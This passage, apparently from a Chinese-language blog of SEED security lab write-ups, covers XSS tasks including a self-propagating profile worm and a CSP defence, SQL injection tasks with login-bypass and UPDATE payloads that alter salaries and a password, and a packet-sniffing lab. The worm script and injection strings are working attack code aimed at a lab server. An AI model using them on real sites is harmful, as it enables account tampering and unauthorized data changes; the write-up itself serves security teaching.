class="line">        <span class="keyword">var</span> guid=<span class="string">&quot;&amp;guid=&quot;</span>+elgg.<span class="property">session</span>.<span class="property">user</span>.<span class="property">guid</span>;</span><br><span class="line">        <span class="keyword">var</span> ts=<span class="string">&quot;&amp;__elgg_ts=&quot;</span>+elgg.<span class="property">security</span>.<span class="property">token</span>.<span class="property">__elgg_ts</span>;</span><br><span class="line">        <span class="keyword">var</span> token=<span class="string">&quot;&amp;__elgg_token=&quot;</span>+elgg.<span class="property">security</span>.<span class="property">token</span>.<span class="property">__elgg_token</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">var</span> content=token + ts + userName +</span><br><span class="line">            <span class="string">&quot;&amp;description=samy%20is%20a%20handsome%20man&amp;accesslevel[description]=2&quot;</span> +guid;</span><br><span class="line">        <span class="keyword">var</span> samyGuid=<span class="number">59</span>;</span><br><span class="line">        <span class="keyword">var</span> sendurl=<span class="string">&quot;http://www.seed-server.com/action/profile/edit&quot;</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(elgg.<span class="property">session</span>.<span class="property">user</span>.<span class="property">guid</span>!=samyGuid)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">var</span> <span class="title class_">Ajax</span>=<span class="literal">null</span>;</span><br><span class="line">            <span class="title class_">Ajax</span>=<span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">            <span class="title class_">Ajax</span>.<span class="title function_">open</span>(<span class="string">&quot;POST&quot;</span>, sendurl, <span class="literal">true</span>);</span><br><span class="line">            <span class="title class_">Ajax</span>.<span class="title function_">setRequestHeader</span>(<span class="string">&quot;Content-Type&quot;</span>,</span><br><span class="line">                                  <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>);</span><br><span class="line">            <span class="title class_">Ajax</span>.<span class="title function_">send</span>(content);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>先看alice主页什么都没有，再次访问samy的主页</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231030210858493.png" alt="image-20231030210858493"></p>
<p>发现主页已经被添加了一句话</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231030210924228.png" alt="image-20231030210924228"></p>
<p><strong>Question 3</strong>: Why do we need Line 14? Remove this line, and repeat your attack. Report and explain your observation.</p>
<p>这行代码是为了防止攻击者自身的主页被篡改导致攻击失败</p>
<h2 id="Task-6-Writing-a-Self-Propagating-XSS-Worm"><a href="#Task-6-Writing-a-Self-Propagating-XSS-Worm" class="headerlink" title="Task 6: Writing a Self-Propagating XSS Worm"></a>Task 6: Writing a Self-Propagating XSS Worm</h2><p>编辑profile，使得可以把自己赋值到别人的 profile 中</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;script id=<span class="string">&quot;worm&quot;</span>&gt;</span><br><span class="line">    <span class="keyword">var</span> headerTag = <span class="string">&quot;&lt;script id=\&quot;worm\&quot; type=\&quot;text/javascript\&quot;&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> jsCode = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;worm&quot;</span>).<span class="property">innerHTML</span>;</span><br><span class="line">    <span class="keyword">var</span> tailTag = <span class="string">&quot;&lt;/&quot;</span> + <span class="string">&quot;script&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> wormCode = <span class="built_in">encodeURIComponent</span>(headerTag + jsCode + tailTag);</span><br><span class="line">    <span class="variable language_">window</span>.<span class="property">onload</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> userName=<span class="string">&quot;&amp;name=&quot;</span>+elgg.<span class="property">session</span>.<span class="property">user</span>.<span class="property">name</span>;</span><br><span class="line">        <span class="keyword">var</span> guid=<span class="string">&quot;&amp;guid=&quot;</span>+elgg.<span class="property">session</span>.<span class="property">user</span>.<span class="property">guid</span>;</span><br><span class="line">        <span class="keyword">var</span> ts=<span class="string">&quot;&amp;__elgg_ts=&quot;</span>+elgg.<span class="property">security</span>.<span class="property">token</span>.<span class="property">__elgg_ts</span>;</span><br><span class="line">        <span class="keyword">var</span> token=<span class="string">&quot;&amp;__elgg_token=&quot;</span>+elgg.<span class="property">security</span>.<span class="property">token</span>.<span class="property">__elgg_token</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">var</span> content=token + ts + userName +</span><br><span class="line">            <span class="string">&quot;&amp;description=&quot;</span> + wormCode + <span class="string">&quot;&amp;accesslevel[description]=2&quot;</span> + </span><br><span class="line">     <span class="string">&quot;&amp;briefdescription=samy%20is%20a%20handsome%20man&amp;accesslevel[briefdescription]=2&quot;</span> +guid;</span><br><span class="line">        <span class="keyword">var</span> samyGuid=<span class="number">59</span>;</span><br><span class="line">        <span class="keyword">var</span> sendurl=<span class="string">&quot;http://www.seed-server.com/action/profile/edit&quot;</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(elgg.<span class="property">session</span>.<span class="property">user</span>.<span class="property">guid</span>!=samyGuid)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">var</span> <span class="title class_">Ajax</span>=<span class="literal">null</span>;</span><br><span class="line">            <span class="title class_">Ajax</span>=<span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">            <span class="title class_">Ajax</span>.<span class="title function_">open</span>(<span class="string">&quot;POST&quot;</span>, sendurl, <span class="literal">true</span>);</span><br><span class="line">            <span class="title class_">Ajax</span>.<span class="title function_">setRequestHeader</span>(<span class="string">&quot;Content-Type&quot;</span>,</span><br><span class="line">                                  <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>);</span><br><span class="line">            <span class="title class_">Ajax</span>.<span class="title function_">send</span>(content);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>alice访问samy主页后发现主页信息已经被修改</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231030213231400.png" alt="image-20231030213231400"></p>
<p>使用Boby访问alice的主页，发现也被修改</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231030213310411.png" alt="image-20231030213310411"></p>
<h2 id="Task-7-Defeating-XSS-Attacks-Using-CSP"><a href="#Task-7-Defeating-XSS-Attacks-Using-CSP" class="headerlink" title="Task 7: Defeating XSS Attacks Using CSP"></a>Task 7: Defeating XSS Attacks Using CSP</h2><p>1.Describe and explain your observations when you visit these websites.</p>
<p><code>http://www.example60.com/</code></p>
<p><code>http://www.example70.com/</code></p>
<p><code>http://www.example32a.com/</code>都显示的几个网站都是OK，表示都添加到白名单之中</p>
<p><code>http://www.example32b.com</code>只有从example70和自己才被信任</p>
<p><code>http://www.example32c.com/</code>只有从example70、自己和111-111-1111才被信任</p>
<p>2.Click the button in the web pages from all the three websites, describe and explain your observations.</p>
<p>只有<code>http://www.example60.com/</code></p>
<p><code>http://www.example70.com/</code></p>
<p><code>http://www.example32a.com/</code>执行成功</p>
<p>3.Change the server configuration on example32b (modify the Apache configuration), so Areas 5 and 6 display OK. Please include your modified configuration in the lab report.</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231030221913592.png" alt="image-20231030221913592"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231030221940791.png" alt="image-20231030221940791"></p>
<p>4.Change the server configuration on example32c (modify the PHP code), so Areas 1, 2, 4, 5, and 6 all display OK. Please include your modified configuration in the lab report.</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231030222522915.png" alt="image-20231030222522915"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231030222530462.png" alt="image-20231030222530462"></p>
<p>5.Please explain why CSP can help prevent Cross-Site Scripting attacks.</p>
<p>CSP添加了一个信任的站点的机制，只会执行信任站点的代码。</p>
<h1 id="SQL-Injection-Attack-Lab"><a href="#SQL-Injection-Attack-Lab" class="headerlink" title="SQL Injection Attack Lab"></a>SQL Injection Attack Lab</h1><h2 id="Task-1-Get-Familiar-with-SQL-Statements"><a href="#Task-1-Get-Familiar-with-SQL-Statements" class="headerlink" title="Task 1: Get Familiar with SQL Statements"></a>Task 1: Get Familiar with SQL Statements</h2><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231106145711833.png" alt="image-20231106145711833"></p>
<h2 id="Task-2-SQL-Injection-Attack-on-SELECT-Statement"><a href="#Task-2-SQL-Injection-Attack-on-SELECT-Statement" class="headerlink" title="Task 2: SQL Injection Attack on SELECT Statement"></a>Task 2: SQL Injection Attack on SELECT Statement</h2><h3 id="Task-2-1-SQL-Injection-Attack-from-webpage"><a href="#Task-2-1-SQL-Injection-Attack-from-webpage" class="headerlink" title="Task 2.1: SQL Injection Attack from webpage"></a>Task 2.1: SQL Injection Attack from webpage</h3><p>查看文档的PHP源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT id, name, eid, salary, birth, ssn, address, email,</span></span><br><span class="line"><span class="string">        nickname, Password</span></span><br><span class="line"><span class="string">        FROM credential</span></span><br><span class="line"><span class="string">        WHERE name= ’<span class="subst">$input_uname</span>’ and Password=’<span class="subst">$hashed_pwd</span>’&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>可以看到sql语句是进行拼接的所以存在SQL注入。并且如果有返回就直接显示对应用户的信息。所以我们只用保持这个sql语句能正常执行并且返回记录。</p>
<p>构造如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin &#x27;; #</span><br></pre></td></tr></table></figure>

<p>密码随意，因为会被注释掉.</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231106154853915.png" alt="image-20231106154853915"></p>
<p>成功！</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231106154907746.png" alt="image-20231106154907746"></p>
<h3 id="Task-2-2-SQL-Injection-Attack-from-command-line"><a href="#Task-2-2-SQL-Injection-Attack-from-command-line" class="headerlink" title="Task 2.2: SQL Injection Attack from command line"></a>Task 2.2: SQL Injection Attack from command line</h3><p>由于是URL请求，需要进行转码。</p>
<p>打开在线工具直接进行转码</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231106155356380.png" alt="image-20231106155356380"></p>
<p>注入成功</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231106155413387.png" alt="image-20231106155413387"></p>
<h3 id="Task-2-3-Append-a-new-SQL-statement"><a href="#Task-2-3-Append-a-new-SQL-statement" class="headerlink" title="Task 2.3: Append a new SQL statement."></a>Task 2.3: Append a new SQL statement.</h3><p>题目让我们使用<code>;</code>分开两条语句。</p>
<p>我们尝试修改Alice的工资为10</p>
<p>修改前：<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231106155819317.png" alt="image-20231106155819317"></p>
<p>构造语句</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin <span class="string">&#x27;; update credential set Salary=10 where Name=&#x27;</span>Alice<span class="string">&#x27;;#</span></span><br></pre></td></tr></table></figure>

<p>但是注入失败</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231106160025575.png" alt="image-20231106160025575"></p>
<h2 id="Task-3-SQL-Injection-Attack-on-UPDATE-Statement"><a href="#Task-3-SQL-Injection-Attack-on-UPDATE-Statement" class="headerlink" title="Task 3: SQL Injection Attack on UPDATE Statement"></a>Task 3: SQL Injection Attack on UPDATE Statement</h2><h3 id="Task-3-1-Modify-your-own-salary"><a href="#Task-3-1-Modify-your-own-salary" class="headerlink" title="Task 3.1: Modify your own salary."></a>Task 3.1: Modify your own salary.</h3><p>可以看到源码是进行字符串拼接来构造sql语句的，所以我们可以使用和上一个任务类似的方式添加一条修改语句.</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231106160440931.png" alt="image-20231106160440931"></p>
<p>构造如下:</p>
<p>我们选在在Nickname之后添加</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test&#x27;, Salary = 50000 where id=&#x27;1&#x27;;#</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231106160936356.png" alt="image-20231106160936356"></p>
<p>利用成功</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231106160948413.png" alt="image-20231106160948413"></p>
<h3 id="Task-3-2-Modify-other-people’-salary"><a href="#Task-3-2-Modify-other-people’-salary" class="headerlink" title="Task 3.2: Modify other people’ salary."></a>Task 3.2: Modify other people’ salary.</h3><p>修改别人的工资只需要将条件修改即可</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test&#x27;, Salary = 1 where name=&#x27;Boby&#x27;;#</span><br></pre></td></tr></table></figure>

<p>修改前：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231106161121281.png" alt="image-20231106161121281"></p>
<p>修改后：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231106161155341.png" alt="image-20231106161155341"></p>
<h3 id="Task-3-3-Modify-other-people’-password"><a href="#Task-3-3-Modify-other-people’-password" class="headerlink" title="Task 3.3: Modify other people’ password."></a>Task 3.3: Modify other people’ password.</h3><p>查看源代码，他会自动给我们将密码进行sha1存储，同时Password字段后面还有phoneNumber字段，所以我们在PhoneNumber输入框进行注释，password就正常填入我们想要修改的密码</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231106162003184.png" alt="image-20231106162003184"></p>
<p>进行如下构造</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; where name=&#x27;Boby&#x27;;#</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231106162053488.png" alt="image-20231106162053488"></p>
<p>password &#x3D; deadbeef</p>
<p>虽然提示</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231106162145414.png" alt="image-20231106162145414"></p>
<p>但是查看数据库，还是修改成功</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231106162201437.png" alt="image-20231106162201437"></p>
<p>登录用户看看,可以使用我们的密码进行登录</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231106162232393.png" alt="image-20231106162232393"></p>
<h2 id="Task-4-Countermeasure-—-Prepared-Statement"><a href="#Task-4-Countermeasure-—-Prepared-Statement" class="headerlink" title="Task 4: Countermeasure — Prepared Statement"></a>Task 4: Countermeasure — Prepared Statement</h2><p>安全页面上 我们使用之前的方法还是可以进行sql注入</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231106163922093.png" alt="image-20231106163922093"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231106163929227.png" alt="image-20231106163929227"></p>
<p>我们现在就修改<code>unsafe.php</code>的工作流来修复漏洞</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231106165938300.png" alt="image-20231106165938300"></p>
<p>可以看到攻击失败</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231106165833826.png" alt="image-20231106165833826"></p>
<h1 id="Packet-Sniffing-and-Spoofing-Lab"><a href="#Packet-Sniffing-and-Spoofing-Lab" class="headerlink" title="Packet Sniffing and Spoofing Lab"></a>Packet Sniffing and Spoofing Lab</h1><h2 id="Lab-Task-Set-1-Using-Scapy-to-Sniff-and-Spoof-Packets"><a href="#Lab-Task-Set-1-Using-Scapy-to-Sniff-and-Spoof-Packets" class="headerlink" title="Lab Task Set 1: Using Scapy to Sniff and Spoof Packets"></a>Lab Task Set 1: Using Scapy to Sniff and Spoof Packets</h2><h3 id="Task-1-1-Sniffing-Packets"><a href="#Task-1-1-Sniffing-Packets" class="headerlink" title="Task 1.1: Sniffing Packets"></a>Task 1.1: Sniffing Packets</h3><h4 id="Task-1-1A"><a href="#Task-1-1A" class="headerlink" title="Task 1.1A"></a>Task 1.1A</h4><p>使用<code>ifconfig</code>查看网卡名</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231113144432050.png" alt="image-20231113144432050"></p>
<p>修改<code>sniffer.py</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231113144450752.png" alt="image-20231113144450752"></p>
<p>使用<code>root</code>身份运行命令。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231113145518831.png" alt="image-20231113145518831"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231113145528704.png" alt="image-20231113145528704"></p>
<p>当切换为普通用户权限时，发现无法进行操作。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231113145605277.png" alt="image-20231113145605277"></p>
<h4 id="Task-1-1B"><a href="#Task-1-1B" class="headerlink" title="Task 1.1B"></a>Task 1.1B</h4><ul>
<li>Capture only the ICMP packet</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231113150806882.png" alt="image-20231113150806882"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogblogimage-20231113145518831.png" alt="image-20231113145518831"></p>
<ul>
<li>Capture any TCP packet that comes from a particular IP and with a destination port number 23.</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231113150933866.png" alt="image-20231113150933866"></p>
<p>我们写一个发包脚本：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231113151132054.png" alt="image-20231113151132054"></p>
<p>运行这两个python，发现成功运行。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231113151240622.png" alt="image-20231113151240622"></p>
<ul>
<li>Capture packets comes from or to go to a particular subnet. You can pick any subnet, such as 128.230.0.0&#x2F;16; you should not pick the subnet that your VM is attached to.</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231113153542179.png" alt="image-20231113153542179"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231113153530699.png" alt="image-20231113153530699"></p>
<h3 id="Task-1-2-Spoofing-ICMP-Packets"><a href="#Task-1-2-Spoofing-ICMP-Packets" class="headerlink" title="Task 1.2: Spoofing ICMP Packets"></a>Task 1.2: Spoofing ICMP Packets</h3><p>自己设定IP的源地址和目的地址</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231113154009569.png" alt="image-20231113154009569"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231113154002075.png" alt="image-20231113154002075"></p>
<p>可以看到正常发送ICMP，以及正常回显ICMP</p>
